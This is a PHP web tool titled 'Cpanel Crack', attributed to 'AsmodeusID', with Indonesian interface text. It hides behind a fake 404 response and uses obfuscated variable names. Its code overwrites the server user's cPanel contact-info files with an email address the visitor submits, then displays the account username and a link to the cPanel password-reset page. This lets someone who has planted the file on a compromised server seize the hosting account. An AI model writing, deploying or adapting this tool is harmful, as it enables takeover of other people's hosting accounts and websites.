<?php 
error_reporting(0);
header("HTTP/1.0 404 Not Found");
echo "<!DOCTYPE html>
<html lang='en'>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name='description' content='Cpanel Reset Password'>
    <meta name='author' content='AsmodeusID'>
    <title>Cpanel Crack</title>

    <!-- Bootstrap core CSS -->
    <link href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css' rel='stylesheet'>
  </head>

  <body>


 
<div class='container'>
      <div class='header clearfix'>
        <h3 class='text-muted'>Cpanel Crack</h3>
      </div>

	<div class='jumbotron'>
<form action='#' method='post'> 	
<input type='email' name='email' placeholder='Email kalian' class='form-control input-lg'/> 	
<input type='submit' name='submit' value='Crack' class='btn btn-danger'/> 	
</form>"; ?> 
<?php
$IIIIIIIIIIII = get_current_user(); 
$IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; 
$IIIIIIIIIIlI = getenv('REMOTE_ADDR'); 
if (isset($_POST['submit'])) { $email = $_POST['email']; 
$IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); 
$IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; 
$IIIIIIIIIlI1 = "2083"; 
$IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1';
$read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo');
if(!$read_named_conf)
{
echo "<h1>Gak Bisa Di Akses Goblok</h1>"; 
}
else
{
echo "<br>Ini User Namenya Salin Lalu Gass <br>"; 
echo '<input class="form-control input-lg" type="text" value="' . $IIIIIIIIIIII . '" id="user"><center><button class="btn btn-danger" onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; 
echo '<br><br><center><a class="btn btn-danger"  target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a></center>'; ;}} ?>
    </div> 
      <footer class='footer'>
        <p>&copy; 2021 - Asmodeus ID</p>
      </footer>
    </div> <!-- /container -->
  </body>
</html>
